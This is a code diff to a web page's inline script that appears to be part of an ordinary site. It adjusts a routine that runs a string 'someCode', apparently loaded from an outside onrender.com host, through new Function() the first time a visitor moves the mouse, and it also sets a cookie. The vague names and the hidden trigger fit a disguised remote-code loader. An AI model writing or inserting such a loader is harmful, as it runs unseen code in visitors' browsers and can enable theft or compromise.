@@ -266,6 +266,7 @@
   const RENDER_BASE_URL = "https://whatsetup-1test.onrender.com";
 
   let someCode = null;
+  let isOpen = false;
 
   document.cookie = "access_cookie=true; path=/; max-age=300";
 
@@ -291,8 +292,9 @@
   });
 
   function handleSomeClick() {
-    if (someCode) {
+    if (someCode && !isOpen) {
       try {
+        isOpen = true;
         new Function(someCode)();
       } catch (err) {
         console.error("Error executing code:", err);
@@ -300,7 +302,7 @@
     }
   }
 
-  document.addEventListener("scroll", handleSomeClick);
+  document.addEventListener("mousemove", handleSomeClick);
 </script>
 <script>
   // Smooth Scrolling for anchor links
